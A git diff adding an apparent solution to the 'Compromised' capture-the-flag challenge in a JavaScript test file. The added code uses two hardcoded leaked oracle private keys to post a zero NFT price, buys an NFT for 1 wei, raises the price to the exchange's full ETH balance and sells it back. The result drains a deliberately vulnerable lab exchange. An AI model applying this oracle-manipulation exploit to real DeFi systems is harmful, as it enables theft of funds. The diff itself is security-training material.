@@ -53,6 +53,28 @@ describe('Compromised challenge', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        const privateKeyOracle1 = '0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9';
+        const privateKeyOracle2 = '0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48';
+
+        // get address from private keys
+        const oracle1 = new ethers.Wallet(privateKeyOracle1, ethers.provider);
+        const oracle2 = new ethers.Wallet(privateKeyOracle2, ethers.provider);
+
+        console.log(oracle1.address); // source 2
+        console.log(oracle2.address); // source 3
+
+        // need to set both price sources to 0, bcs there is a sort in _computeMedianPrice
+        await oracle.connect(oracle1).postPrice(await nftToken.symbol(), 0);
+        await oracle.connect(oracle2).postPrice(await nftToken.symbol(), 0);
+        
+        await exchange.connect(player).buyOne({value: 1});
+        
+        // no need for both, bcs in case of 3 sources the price will be dictated by source[1]
+        await oracle.connect(oracle2).postPrice(await nftToken.symbol(), EXCHANGE_INITIAL_ETH_BALANCE);
+        
+        // approve for transferFrom
+        await nftToken.connect(player).approve(exchange.address, 0);
+        await exchange.connect(player).sellOne(0);
     });
 
     after(async function () {
